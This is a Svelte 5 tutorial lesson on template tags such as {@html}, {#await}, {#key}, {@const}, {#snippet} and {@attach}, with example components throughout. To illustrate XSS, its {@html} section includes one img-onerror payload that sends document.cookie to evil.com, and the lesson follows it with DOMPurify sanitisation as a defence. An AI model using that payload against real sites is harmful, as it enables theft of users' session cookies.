# Template Tags

Svelte's template language goes beyond `{#if}` and `{#each}`. There is a family of specialized template tags that solve problems you encounter in every real application: rendering raw HTML safely, handling asynchronous data, forcing component re-creation, declaring block-scoped variables, defining reusable template fragments, debugging reactive state, and attaching behavior to elements.

Mastering these tags is what separates someone who knows Svelte from someone who is productive in Svelte. Each one exists because the alternative — working around the lack of it — leads to significantly worse code.

## {@html} — Rendering Raw HTML

By default, Svelte escapes all interpolated values. The expression `{userInput}` renders the literal text, not HTML. This protects you from cross-site scripting (XSS) attacks. But sometimes you genuinely need to render HTML — content from a rich text editor, Markdown rendered to HTML, or HTML from a trusted CMS.

The `{@html}` tag renders a string as raw HTML without escaping:

```svelte
<script lang="ts">
  let content = $state('<p>This is <strong>bold</strong> and <em>italic</em> text.</p>');
</script>

<div class="rich-content">
  {@html content}
</div>
```

### XSS Risks and Sanitization

`{@html}` is the single most dangerous feature in Svelte's template language. If the HTML string comes from user input — comments, profile bios, forum posts, any user-generated content — you are opening yourself to XSS attacks:

```svelte
<script lang="ts">
  // DANGEROUS: user-controlled HTML
  let comment = $state('<img src="x" onerror="document.location=\'https://evil.com/steal?cookie=\'+document.cookie">');
</script>

<!-- This executes the attacker's JavaScript -->
{@html comment}
```

The fix is to sanitize the HTML before rendering. Use a library like DOMPurify or sanitize-html:

```svelte
<script lang="ts">
  import DOMPurify from 'dompurify';

  let { rawHtml } = $props<{ rawHtml: string }>();

  // DOMPurify strips all dangerous tags and attributes
  let safeHtml = $derived(DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h2', 'h3', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
    // Force all links to open in new tab with safe rel
    ADD_ATTR: ['target'],
    FORBID_TAGS: ['style', 'script', 'iframe', 'form', 'input'],
  }));
</script>

<article class="prose">
  {@html safeHtml}
</article>
```

**Rules for `{@html}` safety:**
1. Never render user input without sanitization.
2. Content from your own CMS that only admins can edit is safer but still benefits from sanitization — defense in depth.
3. Markdown rendered to HTML on the server is safe if the Markdown parser does not pass through raw HTML (many do by default — check your parser's settings).
4. Static HTML strings defined in your own source code are safe.

### Rendering Markdown

A common pattern is converting Markdown to HTML and rendering it:

```svelte
<script lang="ts">
  import { marked } from 'marked';
  import DOMPurify from 'dompurify';

  let { markdown } = $props<{ markdown: string }>();

  let html = $derived(DOMPurify.sanitize(marked.parse(markdown) as string));
</script>

<div class="prose">
  {@html html}
</div>
```

### Limitation: No Svelte Components Inside {@html}

The HTML rendered by `{@html}` is plain DOM — Svelte components, event handlers, and bindings inside it will not work. If you need interactive content, use snippets or component composition instead.

## {#await} — Handling Promises in Templates

The `{#await}` block lets you handle promises directly in your template — showing loading, success, and error states without extra flag variables or manual state management:

```svelte
<script lang="ts">
  async function loadUser(id: number) {
    const res = await fetch(`https://jsonplaceholder.typicode.com/users/${id}`);
    if (!res.ok) throw new Error(`Failed to load user (${res.status})`);
    return res.json() as Promise<{ name: string; email: string; phone: string }>;
  }

  let userId = $state(1);
  let userPromise = $derived(loadUser(userId));
</script>

<label>User ID: <input type="number" min={1} max={10} bind:value={userId} /></label>

{#await userPromise}
  <div class="skeleton" aria-busy="true">
    <div class="skeleton-line" style="width: 60%"></div>
    <div class="skeleton-line" style="width: 80%"></div>
  </div>
{:then user}
  <div class="user-card">
    <h2>{user.name}</h2>
    <p>{user.email}</p>
    <p>{user.phone}</p>
  </div>
{:catch error}
  <div class="error" role="alert">
    <p>Error: {error.message}</p>
    <button onclick={() => userId = userId}>Retry</button>
  </div>
{/await}
```

The three sections are: `{#await promise}` (pending/loading), `{:then value}` (resolved/success), and `{:catch error}` (rejected/failure). When `userId` changes, `$derived` creates a new promise. The `{#await}` block immediately shows the pending state, then transitions to `:then` or `:catch` when the promise settles.

### Short Forms

If you do not need a loading state — for example, if the data loads fast enough or if the component is below the fold — use the short form:

```svelte
{#await configPromise then config}
  <p>App version: {config.version}</p>
{/await}
```

If you only care about errors:

```svelte
{#await riskyOperation catch error}
  <p class="error">{error.message}</p>
{/await}
```

### Combining Await with Derived for Dependent Fetches

Sometimes you need to load data that depends on previously loaded data. Chain `$derived` values:

```svelte
<script lang="ts">
  let teamId = $state(1);

  async function loadTeam(id: number) {
    const res = await fetch(`/api/teams/${id}`);
    return res.json() as Promise<{ name: string; leaderId: number }>;
  }

  async function loadUser(id: number) {
    const res = await fetch(`/api/users/${id}`);
    return res.json() as Promise<{ name: string; avatar: string }>;
  }

  let teamPromise = $derived(loadTeam(teamId));
</script>

{#await teamPromise}
  <p>Loading team...</p>
{:then team}
  <h2>{team.name}</h2>

  <!-- Dependent fetch: load the team leader -->
  {#await loadUser(team.leaderId)}
    <p>Loading team leader...</p>
  {:then leader}
    <div class="leader">
      <img src={leader.avatar} alt={leader.name} />
      <span>Led by {leader.name}</span>
    </div>
  {:catch}
    <p>Could not load team leader.</p>
  {/await}
{:catch error}
  <p>Error: {error.message}</p>
{/await}
```

### Practical Pattern: Await with Skeleton UI

Production apps show skeleton screens, not "Loading..." text:

```svelte
{#await productsPromise}
  <div class="product-grid">
    {#each Array(6) as _}
      <div class="product-card skeleton">
        <div class="skeleton-image"></div>
        <div class="skeleton-line" style="width: 70%"></div>
        <div class="skeleton-line" style="width: 40%"></div>
      </div>
    {/each}
  </div>
{:then products}
  <div class="product-grid">
    {#each products as product (product.id)}
      <ProductCard {product} />
    {/each}
  </div>
{:catch error}
  <ErrorBanner message={error.message} retry={() => { /* re-trigger */ }} />
{/await}
```

## {#key} — Forcing Re-Creation

The `{#key}` block destroys and recreates its contents whenever the expression changes. This is fundamentally different from updating — the old DOM nodes are removed and new ones are created from scratch. This serves two purposes: resetting component state and retriggering intro animations.

```svelte
<script lang="ts">
  let currentTab = $state('profile');
</script>

<nav>
  <button onclick={() => currentTab = 'profile'}>Profile</button>
  <button onclick={() => currentTab = 'settings'}>Settings</button>
  <button onclick={() => currentTab = 'billing'}>Billing</button>
</nav>

{#key currentTab}
  <div class="tab-panel" style="animation: fadeIn 0.3s ease">
    <h2>{currentTab}</h2>
    <p>Content for the {currentTab} tab.</p>
  </div>
{/key}

<style>
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }
</style>
```

Every time `currentTab` changes, the DOM element is torn down and rebuilt, so the CSS animation replays from the beginning.

### Resetting Component State

The most powerful use of `{#key}` is resetting a child component's internal state:

```svelte
<script lang="ts">
  import EditForm from '$lib/components/EditForm.svelte';
  let selectedId = $state(1);
</script>

<select bind:value={selectedId}>
  <option value={1}>Item 1</option>
  <option value={2}>Item 2</option>
  <option value={3}>Item 3</option>
</select>

{#key selectedId}
  <EditForm id={selectedId} />
{/key}
```

When `selectedId` changes, the old `EditForm` is destroyed (clearing all its internal `$state` values, form inputs, scroll position, etc.) and a new one is created with fresh state. Without `{#key}`, Svelte would update the existing component's props but keep its internal state intact — which means stale form values, dirty flags, and validation errors from the previous item would persist.

### When NOT to Use {#key}

Do not wrap everything in `{#key}` "just to be safe." Destroying and recreating DOM is expensive. It loses focus state, scroll position, and animation progress. Use it only when you specifically need a clean slate:

```svelte
<!-- BAD: unnecessary {#key} — just update the prop -->
{#key userId}
  <UserAvatar id={userId} />
{/key}

<!-- GOOD: let Svelte update the existing component -->
<UserAvatar id={userId} />
```

The second version is faster because Svelte updates the `id` prop and the component handles the change internally. Use `{#key}` only when the component does not properly handle prop changes, or when you need internal state to reset.

### {#key} with Transitions

`{#key}` pairs naturally with Svelte transitions for animated content swaps:

```svelte
<script lang="ts">
  import { fly } from 'svelte/transition';
  let tab = $state('one');
</script>

{#key tab}
  <div in:fly={{ y: 20, duration: 200 }}>
    <p>Content for tab: {tab}</p>
  </div>
{/key}
```

## {@const} — Block-Scoped Constants

The `{@const}` tag creates a read-only variable scoped to the nearest block (`{#if}`, `{#each}`, `{#snippet}`, `{:then}`, `{:catch}`). This keeps derived calculations close to where they are used instead of cluttering the `<script>` block:

```svelte
<script lang="ts">
  let products = $state([
    { name: 'Widget', price: 9.99, quantity: 3 },
    { name: 'Gadget', price: 24.99, quantity: 1 },
    { name: 'Doohickey', price: 4.99, quantity: 10 }
  ]);
</script>

<ul>
  {#each products as product}
    {@const total = product.price * product.quantity}
    {@const isExpensive = total > 20}
    {@const formattedTotal = `$${total.toFixed(2)}`}
    <li class:expensive={isExpensive}>
      {product.name}: {formattedTotal}
      {#if isExpensive}
        <span class="badge">High value</span>
      {/if}
    </li>
  {/each}
</ul>

<style>
  .expensive { color: #e74c3c; font-weight: bold; }
  .badge {
    font-size: 0.7em;
    background: #fecaca;
    color: #991b1b;
    padding: 0.1em 0.4em;
    border-radius: 0.25em;
  }
</style>
```

Without `{@const}`, you would either repeat `product.price * product.quantity` in multiple places or move it to a helper function in the script. `{@const}` keeps the calculation right next to where it is used, which is easier to read and maintain.

### {@const} in Other Blocks

`{@const}` works in any block, not just `{#each}`:

```svelte
<script lang="ts">
  let user = $state<{ name: string; role: 'admin' | 'user' | 'viewer' } | null>(null);
</script>

{#if user}
  {@const isAdmin = user.role === 'admin'}
  {@const displayName = user.name || 'Anonymous'}
  <p>Welcome, {displayName}. {isAdmin ? 'You have admin access.' : ''}</p>
{/if}

{#await fetchPermissions() then permissions}
  {@const canEdit = permissions.includes('edit')}
  {@const canDelete = permissions.includes('delete')}
  <div>
    <button disabled={!canEdit}>Edit</button>
    <button disabled={!canDelete}>Delete</button>
  </div>
{/await}
```

### {@const} Limitations

`{@const}` variables are truly read-only. You cannot reassign them:

```svelte
{#each items as item}
  {@const label = item.name.toUpperCase()}
  <!-- ERROR: label = 'something' would fail at compile time -->
{/each}
```

They can only appear at the top of a block — not after other elements. They also cannot reference other `{@const}` variables declared later in the same block (no forward references), but they can reference earlier ones:

```svelte
{#each items as item}
  {@const subtotal = item.price * item.qty}
  {@const tax = subtotal * 0.08}
  {@const total = subtotal + tax}  <!-- This works: references earlier @const -->
  <p>{item.name}: ${total.toFixed(2)}</p>
{/each}
```

## {@debug} — Reactive Breakpoints

The `{@debug}` tag pauses the browser debugger when any of the listed variables change. It only works when DevTools is open and only in development mode — it is stripped from production builds:

```svelte
<script lang="ts">
  let count = $state(0);
  let name = $state('Alice');
</script>

{@debug count, name}

<button onclick={() => count++}>Increment: {count}</button>
<input bind:value={name} />
```

When `count` or `name` changes, the browser pauses execution right at that point in the template rendering. You can inspect the component's state in the debugger's scope.

A bare `{@debug}` without arguments pauses on every re-render of the template, which helps you understand how often a component updates:

```svelte
{@debug}
<p>This component just re-rendered</p>
```

`{@debug}` is for emergency debugging — when you need to understand exactly what is happening at a specific point in the template. For regular development logging, `$inspect` (covered in the debugging lesson) is more convenient since it does not pause execution.

## {#snippet} — Reusable Template Fragments

Snippets are reusable blocks of template defined inside a component. They are Svelte 5's replacement for slots and are more powerful because they are just functions — you can pass them as props, store them in variables, and call them conditionally:

```svelte
<script lang="ts">
  let users = $state([
    { name: 'Alice', role: 'admin', active: true },
    { name: 'Bob', role: 'user', active: false },
    { name: 'Carol', role: 'user', active: true }
  ]);
</script>

{#snippet userRow(user: { name: string; role: string; active: boolean })}
  <tr class:inactive={!user.active}>
    <td>{user.name}</td>
    <td><span class="badge badge-{user.role}">{user.role}</span></td>
    <td>{user.active ? 'Active' : 'Inactive'}</td>
  </tr>
{/snippet}

<table>
  <thead>
    <tr><th>Name</th><th>Role</th><th>Status</th></tr>
  </thead>
  <tbody>
    {#each users as user (user.name)}
      {@render userRow(user)}
    {/each}
  </tbody>
</table>
```

### Passing Snippets as Props

Snippets can be passed to child components as props, replacing the old slot pattern:

```svelte
<!-- Parent.svelte -->
<script lang="ts">
  import DataTable from './DataTable.svelte';

  let items = $state([
    { id: 1, name: 'Widget', price: 9.99 },
    { id: 2, name: 'Gadget', price: 24.99 }
  ]);
</script>

{#snippet row(item: { id: number; name: string; price: number })}
  <td>{item.id}</td>
  <td>{item.name}</td>
  <td>${item.price.toFixed(2)}</td>
{/snippet}

{#snippet empty()}
  <tr><td colspan="3" class="text-center">No items found.</td></tr>
{/snippet}

<DataTable {items} {row} {empty} />
```

```svelte
<!-- DataTable.svelte -->
<script lang="ts">
  import type { Snippet } from 'svelte';

  let { items, row, empty }: {
    items: any[];
    row: Snippet<[any]>;
    empty?: Snippet;
  } = $props();
</script>

<table>
  <tbody>
    {#each items as item (item.id)}
      <tr>{@render row(item)}</tr>
    {:else}
      {#if empty}
        {@render empty()}
      {:else}
        <tr><td>No data</td></tr>
      {/if}
    {/each}
  </tbody>
</table>
```

### Conditional Snippets

Since snippets are values, you can choose which one to render at runtime:

```svelte
<script lang="ts">
  let viewMode = $state<'grid' | 'list'>('grid');
</script>

{#snippet gridView(item: { name: string; image: string })}
  <div class="grid-card">
    <img src={item.image} alt={item.name} />
    <p>{item.name}</p>
  </div>
{/snippet}

{#snippet listView(item: { name: string; image: string })}
  <div class="list-row">
    <img src={item.image} alt={item.name} class="thumb" />
    <span>{item.name}</span>
  </div>
{/snippet}

{@const renderItem = viewMode === 'grid' ? gridView : listView}

<button onclick={() => viewMode = viewMode === 'grid' ? 'list' : 'grid'}>
  Toggle View
</button>

<div class={viewMode === 'grid' ? 'grid' : 'list'}>
  {#each items as item}
    {@render renderItem(item)}
  {/each}
</div>
```

## {@render} — Rendering Snippets

The `{@render}` tag calls a snippet and renders its output. You have seen it above, but there are nuances worth understanding.

### Optional Snippets

When a snippet prop might not be provided, use optional chaining syntax:

```svelte
<script lang="ts">
  import type { Snippet } from 'svelte';

  let { header, footer }: {
    header?: Snippet;
    footer?: Snippet;
  } = $props();
</script>

{#if header}
  <header>{@render header()}</header>
{/if}

<main>
  <!-- main content -->
</main>

{#if footer}
  <footer>{@render footer()}</footer>
{/if}
```

### Children Snippet

The default content between a component's opening and closing tags is available as the `children` snippet:

```svelte
<!-- Card.svelte -->
<script lang="ts">
  import type { Snippet } from 'svelte';

  let { children, title }: {
    children: Snippet;
    title: string;
  } = $props();
</script>

<div class="card">
  <h3>{title}</h3>
  <div class="card-body">
    {@render children()}
  </div>
</div>
```

```svelte
<!-- Usage -->
<Card title="Welcome">
  <p>This is the card body content.</p>
  <p>Anything here becomes the children snippet.</p>
</Card>
```

## {@attach} — Attaching Actions to Elements

The `{@attach}` tag lets you attach behavior to DOM elements. This is the Svelte 5 way to run code when an element is mounted, similar to Svelte 4's `use:action` but with a more composable design:

```svelte
<script lang="ts">
  import { focusTrap, clickOutside, tooltip } from '$lib/actions';
</script>

<div {@attach focusTrap()}>
  <input placeholder="Focus is trapped here" />
  <button>Submit</button>
</div>

<div {@attach clickOutside(() => console.log('Clicked outside!'))}>
  <p>Click outside this box to trigger the callback.</p>
</div>

<button {@attach tooltip('Save your work')}>
  Save
</button>
```

### Writing an Attach Function

An attach function receives the element and returns a cleanup function:

```typescript
// src/lib/actions/index.ts
export function clickOutside(callback: () => void) {
  return (element: HTMLElement) => {
    function handler(event: MouseEvent) {
      if (!element.contains(event.target as Node)) {
        callback();
      }
    }

    document.addEventListener('click', handler, true);

    return () => {
      document.removeEventListener('click', handler, true);
    };
  };
}

export function tooltip(text: string) {
  return (element: HTMLElement) => {
    let tooltipEl: HTMLDivElement | null = null;

    function show() {
      tooltipEl = document.createElement('div');
      tooltipEl.className = 'tooltip';
      tooltipEl.textContent = text;
      document.body.appendChild(tooltipEl);

      const rect = element.getBoundingClientRect();
      tooltipEl.style.top = `${rect.top - 30 + window.scrollY}px`;
      tooltipEl.style.left = `${rect.left + rect.width / 2}px`;
    }

    function hide() {
      tooltipEl?.remove();
      tooltipEl = null;
    }

    element.addEventListener('mouseenter', show);
    element.addEventListener('mouseleave', hide);

    return () => {
      hide();
      element.removeEventListener('mouseenter', show);
      element.removeEventListener('mouseleave', hide);
    };
  };
}
```

### Multiple Attachments

You can attach multiple behaviors to the same element:

```svelte
<div
  {@attach focusTrap()}
  {@attach clickOutside(() => close())}
  {@attach ariaDescribe('Modal dialog')}
>
  <!-- content -->
</div>
```

## The Each-Else Pattern

The `{#each}` block has a `{:else}` clause that renders when the array is empty:

```svelte
<script lang="ts">
  let notifications = $state<{ id: number; text: string; read: boolean }[]>([]);
</script>

<button onclick={() => notifications.push({
  id: Date.now(),
  text: `Alert at ${new Date().toLocaleTimeString()}`,
  read: false
})}>
  Add Notification
</button>
<button onclick={() => notifications = []}>Clear All</button>

<ul class="notification-list">
  {#each notifications as note (note.id)}
    {@const age = Date.now() - note.id}
    <li class:unread={!note.read}>
      <span>{note.text}</span>
      <button onclick={() => {
        const idx = notifications.indexOf(note);
        if (idx >= 0) notifications.splice(idx, 1);
      }}>Dismiss</button>
    </li>
  {:else}
    <li class="empty-state">
      <p>No notifications</p>
      <p class="subtitle">You are all caught up!</p>
    </li>
  {/each}
</ul>
```

This is significantly cleaner than wrapping the list in an `{#if items.length > 0}` check. The `{:else}` clause also handles the case where the array is `undefined` or `null` if your data might be in that state.

## Combining Tags — Complete Example

Here is a real-world example combining most template tags to build a data dashboard panel:

```svelte
<script lang="ts">
  import type { Snippet } from 'svelte';
  import DOMPurify from 'dompurify';

  type DataItem = {
    id: number;
    title: string;
    description: string; // May contain HTML from CMS
    value: number;
    status: 'active' | 'pending' | 'error';
  };

  let refreshKey = $state(0);

  async function loadData(): Promise<DataItem[]> {
    const res = await fetch('/api/dashboard-data');
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
  }

  let dataPromise = $derived.by(() => {
    refreshKey; // Reference to create dependency
    return loadData();
  });
</script>

{#snippet statusBadge(status: DataItem['status'])}
  {@const color = status === 'active' ? 'green' : status === 'pending' ? 'yellow' : 'red'}
  {@const label = status.charAt(0).toUpperCase() + status.slice(1)}
  <span class="badge" style="--badge-color: {color}">{label}</span>
{/snippet}

{#snippet itemCard(item: DataItem)}
  {@const sanitizedDesc = DOMPurify.sanitize(item.description)}
  {@const formattedValue = new Intl.NumberFormat('en-US', {
    style: 'currency', currency: 'USD'
  }).format(item.value / 100)}

  <div class="card">
    <div class="card-header">
      <h3>{item.title}</h3>
      {@render statusBadge(item.status)}
    </div>
    <div class="card-body">
      {@html sanitizedDesc}
    </div>
    <div class="card-footer">
      <span class="value">{formattedValue}</span>
    </div>
  </div>
{/snippet}

<div class="dashboard">
  <div class="toolbar">
    <h2>Dashboard</h2>
    <button onclick={() => refreshKey++}>Refresh</button>
  </div>

  {#key refreshKey}
    {#await dataPromise}
      <div class="grid">
        {#each Array(4) as _}
          <div class="card skeleton">
            <div class="skeleton-line"></div>
            <div class="skeleton-line short"></div>
          </div>
        {/each}
      </div>
    {:then items}
      <div class="grid">
        {#each items as item (item.id)}
          {@render itemCard(item)}
        {:else}
          <p class="empty">No data available.</p>
        {/each}
      </div>
    {:catch error}
      <div class="error-panel" role="alert">
        <p>Failed to load data: {error.message}</p>
        <button onclick={() => refreshKey++}>Try Again</button>
      </div>
    {/await}
  {/key}
</div>
```

This example uses: `{#snippet}` for reusable template fragments, `{@render}` to call those snippets, `{@const}` for block-scoped calculations, `{@html}` for CMS content with sanitization, `{#await}` for async data loading with skeleton UI, `{#key}` to force re-fetch on refresh, and `{#each}` with `{:else}` for empty states.

## Try It

Build a "Post Viewer" that fetches posts from `https://jsonplaceholder.typicode.com/posts?_limit=5`. Use `{#await}` for loading, success, and error states with a skeleton UI for loading. Display posts with `{#each}` and define a `{#snippet}` called `postCard` for each post. Inside the snippet, use `{@const}` to create a `preview` variable truncating each body to 80 characters and a `wordCount` variable. Add `{:else}` for the empty state. Wrap the list in `{#key}` that re-fetches when a "Refresh" button increments a counter. Add a "view mode" toggle (grid/list) using conditional snippet rendering. Finally, simulate a rich text field by rendering one post's body through `{@html}` with DOMPurify sanitization.

## Key Takeaways

- `{@html string}` renders raw HTML without escaping — always sanitize user-generated content with DOMPurify or similar to prevent XSS
- `{#await promise}` handles loading, success, and error states directly in templates — use skeleton UIs for production loading states
- The short form `{#await promise then value}` skips the loading state; `{#await promise catch error}` handles only errors
- `{#key expression}` destroys and recreates contents when the expression changes — use it to reset component state or retrigger animations, but not for simple prop updates
- `{@const}` creates block-scoped constants inside `{#each}`, `{#if}`, `{:then}`, `{#snippet}` — they can reference earlier `{@const}` in the same block
- `{@debug}` pauses the browser debugger when watched variables change — development only, stripped in production
- `{#snippet}` defines reusable template fragments that can accept typed parameters and be passed as component props (replacing slots)
- `{@render}` calls a snippet — check for existence before rendering optional snippets
- `{@attach}` attaches behavior to DOM elements with automatic cleanup, replacing the `use:action` pattern from Svelte 4
- `{:else}` on `{#each}` provides a clean empty-state pattern that also handles `null`/`undefined` arrays
- The `children` snippet captures the default content between a component's opening and closing tags
